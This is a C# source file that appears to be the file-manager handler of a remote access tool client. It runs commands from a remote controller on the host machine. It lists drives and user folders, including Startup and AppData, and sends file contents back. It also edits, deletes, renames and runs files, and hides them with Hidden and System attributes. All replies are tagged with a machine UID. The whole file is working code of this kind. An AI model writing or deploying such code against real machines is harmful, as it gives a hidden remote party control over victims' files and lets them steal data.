using Client.Network;
using Client.Utils;
using FastSearchLibrary;
using PacketLib;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Client.Handlers
{
    internal class HandleFileManager
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SHFILEINFO
        {
            public IntPtr hIcon;
            public int iIcon;
            public uint dwAttributes;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szDisplayName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
            public string szTypeName;
        };

        public static class FILE_ATTRIBUTE
        {
            public const uint FILE_ATTRIBUTE_NORMAL = 0x80;
        }

        public static class SHGFI
        {
            public const uint SHGFI_TYPENAME = 0x000000400;
            public const uint SHGFI_USEFILEATTRIBUTES = 0x000000010;
        }

        [DllImport("shell32.dll")]
        public static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbSizeFileInfo, uint uFlags);

        public HandleFileManager(MsgUnpack msgUnpack)
        {
            try
            {
                switch (msgUnpack.GetAsString("Command"))
                {
                    case "Drives":
                        {
                            GetDrives();
                            break;
                        }
                    case "Cd":
                        {
                            Cd(msgUnpack.GetAsString("Path"));
                            break;
                        }
                    case "Open":
                        {
                            string target = msgUnpack.GetAsString("Target");
                            if (string.IsNullOrEmpty(target)) return;
                            if (!Directory.Exists(target) && !File.Exists(target)) return;
                            Process.Start(target);
                            break;
                        }
                    case "Rename":
                        {

                            string _old = msgUnpack.GetAsString("Old");
                            string _new = msgUnpack.GetAsString("New");
                            bool isFolder = msgUnpack.GetAsBoolen("isFolder");
                            if (isFolder)
                            {
                                Directory.Move(_old, _new);
                            }
                            else
                            {
                                File.Move(_old, _new);
                            }

                            break;
                        }
                    case "Paste":
                        {
                            string path = msgUnpack.GetAsString("Path");
                            int filesCount = msgUnpack.GetAsStringArray("Target_Files").Length;
                            int foldersCount = msgUnpack.GetAsStringArray("Target_Folders").Length;
                            if (filesCount > 0)
                            {
                                foreach (string file in msgUnpack.GetAsStringArray("Target_Files"))
                                {
                                    string des = Path.Combine(path, Path.GetFileName(file));
                                    File.Copy(file, des);
                                }
                                Logger.InfoLog($"{filesCount} Files copied to {path} !");
                            }
                            if (foldersCount > 0)
                            {
                                foreach (string folder in msgUnpack.GetAsStringArray("Target_Folders"))
                                {
                                    DirectoryCopy.DirCopy(folder, path);
                                }
                                Logger.InfoLog($"{foldersCount} Folders copied to {path} !");
                            }

                            break;
                        }
                    case "New":
                        {
                            string target = msgUnpack.GetAsString("Target");
                            bool isFolder = msgUnpack.GetAsBoolen("isFolder");
                            if (isFolder)
                            {
                                Directory.CreateDirectory(target);
                            }
                            else
                            {
                                File.Create(target).Close();
                            }
                        }

                        break;
                    case "Delete":
                        {

                            string target = msgUnpack.GetAsString("Target");
                            bool isFolder = msgUnpack.GetAsBoolen("isFolder");
                            if (isFolder)
                            {
                                Directory.Delete(target, true);
                            }
                            else
                            {
                                File.Delete(target);
                            }

                            break;
                        }
                    case "Search":
                        {
                            string path = msgUnpack.GetAsString("Path");
                            string pattern = msgUnpack.GetAsString("Pattern");
                            if (!Directory.Exists(path)) return;
                            StringBuilder sbFile = new StringBuilder();
                            Task<List<FileInfo>> matchedFiles = FileSearcher.GetFilesFastAsync(path, pattern);
                            MsgPack msgPack = new MsgPack();
                            msgPack.Set("Packet", "FileManager");
                            msgPack.Set("UID", UID.Get());
                            msgPack.Set("Command", "Cd");
                            msgPack.Set("CurrentPath", path);
                            msgPack.Set("Folders", string.Empty);
                            foreach (FileInfo matchedFile in matchedFiles.Result)
                            {
                                string file = matchedFile.FullName;
                                using (MemoryStream ms = new MemoryStream())
                                {
                                    GetIcon(file.ToLower()).Save(ms, ImageFormat.Png);
                                    sbFile.Append(Path.GetFileName(file) + "-=>" + new FileInfo(file).LastWriteTime + "-=>" + getSHFILEINFO(file).szTypeName + "-=>" + Helpers.BytesToString(new FileInfo(file).Length) + "-=>" + Path.GetFullPath(file) + "-=>" + Convert.ToBase64String(ms.ToArray()) + "-=>");
                                }
                            }
                            msgPack.Set("Files", sbFile.ToString());
                            _Client.Send(msgPack.Pack());
                            break;
                        }
                    case "Edit":
                        {
                            string filePath = msgUnpack.GetAsString("File");
                            if (!File.Exists(filePath)) return;
                            switch (msgUnpack.GetAsString("Do"))
                            {
                                case "Get":
                                    {
                                        string EUID = msgUnpack.GetAsString("EUID");
                                        string fileContent = File.ReadAllText(filePath);
                                        MsgPack msgPack = new MsgPack();
                                        msgPack.Set("Packet", "Editor");
                                        msgPack.Set("UID", UID.Get());
                                        msgPack.Set("EUID", EUID);
                                        msgPack.Set("File", filePath);
                                        msgPack.Set("FileSize", Helpers.BytesToString(new FileInfo(filePath).Length));
                                        msgPack.Set("FileContent", fileContent);
                                        _Client.Send(msgPack.Pack());
                                        break;
                                    }
                                case "Set":
                                    {
                                        string fileContent = msgUnpack.GetAsString("FileContent");
                                        File.WriteAllText(filePath, fileContent);
                                        Logger.InfoLog("File saved !\nLocation: " + filePath);
                                        break;
                                    }

                            }
                            break;
                        }
                    case "Hide":
                        {
                            string target = msgUnpack.GetAsString("Target");
                            bool isFolder = msgUnpack.GetAsBoolen("isFolder");
                            if (isFolder)
                            {
                                if (!Directory.Exists(target)) return;
                                new DirectoryInfo(target).Attributes = FileAttributes.Hidden | FileAttributes.System;
                            }
                            else
                            {
                                if (!File.Exists(target)) return;
                                new FileInfo(target).Attributes = FileAttributes.Hidden | FileAttributes.System;
                            }
                            break;
                        }
                    case "Show":
                        {
                            string target = msgUnpack.GetAsString("Target");
                            bool isFolder = msgUnpack.GetAsBoolen("isFolder");
                            if (isFolder)
                            {
                                if (!Directory.Exists(target)) return;
                                new DirectoryInfo(target).Attributes = FileAttributes.Normal;
                            }
                            else
                            {
                                if (!File.Exists(target)) return;
                                new FileInfo(target).Attributes = FileAttributes.Normal;
                            }
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Logger.ErrorLog(ex.Message);
                return;
            }
        }

        public void Cd(string path)
        {
            switch (path)
            {
                case "UserProfile":
                    {
                        path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                        break;
                    }
                case "Desktop":
                    {
                        path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"Desktop"); ;
                        break;
                    }
                case "Downloads":
                    {
                        path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"Downloads");
                        break;
                    }
                case "Pictures":
                    {
                        path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"Pictures");
                        break;
                    }
                case "Documents":
                    {
                        path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"Documents");
                        break;
                    }
                case "Videos":
                    {
                        path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"Videos");
                        break;
                    }
                case "Music":
                    {
                        path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"Music");
                        break;
                    }
                case "OneDrive":
                    {
                        path = Environment.GetEnvironmentVariable("OneDrive");
                        break;
                    }
                case "Appdata":
                    {
                        path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                        break;
                    }
                case "LocalAppdata":
                    {
                        path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                        break;
                    }
                case "Temp":
                    {
                        path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Temp");
                        break;
                    }
                case "Startup":
                    {
                        path = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                        break;
                    }
                case "Windows":
                    {
                        path = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                        break;
                    }
            }
            if (!Directory.Exists(path)) return;

            StringBuilder sbFolder = new StringBuilder();
            StringBuilder sbFile = new StringBuilder();

            MsgPack msgPack = new MsgPack();
            msgPack.Set("Packet", "FileManager");
            msgPack.Set("UID", UID.Get());
            msgPack.Set("Command", "Cd");
            msgPack.Set("CurrentPath", path);

            foreach (string folder in Directory.GetDirectories(path))
            {
                sbFolder.Append(Path.GetFileName(folder) + "-=>" + new DirectoryInfo(folder).LastWriteTime + "-=>" + Path.GetFullPath(folder) + "-=>");
            }
            msgPack.Set("Folders", sbFolder.ToString());

            foreach (string file in Directory.GetFiles(path))
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    GetIcon(file.ToLower()).Save(ms, ImageFormat.Png);
                    sbFile.Append(Path.GetFileName(file) + "-=>" + new FileInfo(file).LastWriteTime + "-=>" + getSHFILEINFO(file).szTypeName + "-=>" + Helpers.BytesToString(new FileInfo(file).Length) + "-=>" + Path.GetFullPath(file) + "-=>" + Convert.ToBase64String(ms.ToArray()) + "-=>");
                }
            }
            msgPack.Set("Files", sbFile.ToString());
            _Client.Send(msgPack.Pack());
        }
        private SHFILEINFO getSHFILEINFO(string filePath)
        {
            SHFILEINFO info = new SHFILEINFO();
            uint dwFileAttributes = FILE_ATTRIBUTE.FILE_ATTRIBUTE_NORMAL;
            uint uFlags = (uint)(SHGFI.SHGFI_TYPENAME | SHGFI.SHGFI_USEFILEATTRIBUTES);
            SHGetFileInfo(Path.GetFullPath(filePath), dwFileAttributes, ref info, (uint)Marshal.SizeOf(info), uFlags);
            return info;
        }
        private Bitmap GetIcon(string file)
        {
            try
            {
                if (file.EndsWith("jpg") || file.EndsWith("jpeg") || file.EndsWith("gif") || file.EndsWith("png") || file.EndsWith("bmp"))
                {
                    using (Bitmap myBitmap = new Bitmap(file))
                    {
                        return new Bitmap(myBitmap.GetThumbnailImage(48, 48, new Image.GetThumbnailImageAbort(() => false), IntPtr.Zero));
                    }
                }
                else
                    using (Icon icon = Icon.ExtractAssociatedIcon(file))
                    {
                        return icon.ToBitmap();
                    }
            }
            catch
            {
                return new Bitmap(48, 48);
            }
        }
        public void GetDrives()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            StringBuilder sbDriver = new StringBuilder();
            MsgPack msgPack = new MsgPack();
            msgPack.Set("Packet", "FileManager");
            msgPack.Set("UID", UID.Get());
            msgPack.Set("Command", "Drives");
            foreach (DriveInfo d in allDrives)
            {
                if (d.IsReady)
                {
                    msgPack.Set(d.Name, string.Empty);
                }
            }
            _Client.Send(msgPack.Pack());
        }

    }
    class DirectoryCopy
    {
        public static void DirCopy(string source, string destination, int taskCount = 2)
        {
            dirCollection = new List<string>();
            SemaphoreSlim semaphoreSlim = new SemaphoreSlim(taskCount);
            List<Task> tasks = new List<Task>();
            RetriveDirs(source);
            foreach (string dir in dirCollection)
            {
                string NewPath = Path.Combine(destination, ParseDir(dir, source, destination));
                if (Directory.Exists(NewPath)) continue;
                Directory.CreateDirectory(NewPath);
                foreach (string file in Directory.GetFiles(dir))
                {
                    tasks.Add(Task.Run(() =>
                    {
                        semaphoreSlim.Wait();
                        string NewFilePath = Path.Combine(NewPath, Path.GetFileName(file));
                        File.Copy(file, NewFilePath, true);
                        semaphoreSlim.Release();
                    }));
                }
            }
            Task.WaitAll(tasks.ToArray());
        }
        static string ParseDir(string value, string oldValue, string newValue)
        {
            if (value.StartsWith(oldValue))
            {
                oldValue = oldValue.Remove(oldValue.LastIndexOfAny(new char[] { '\\' }, oldValue.LastIndexOf('\\')));
                value = value.Remove(0, oldValue.Length);
                value = newValue + value;
            }
            return value;
        }
        static List<string> dirCollection { get; set; }
        static void RetriveDirs(string dir)
        {
            try
            {
                dirCollection.Add(dir);
                string[] dirs = Directory.GetDirectories(dir);
                if (!(dirs.Length > 0)) return;
                foreach (string sdir in dirs)
                {
                    RetriveDirs(sdir);
                }
            }
            catch
            {
            }
        }
    }
}
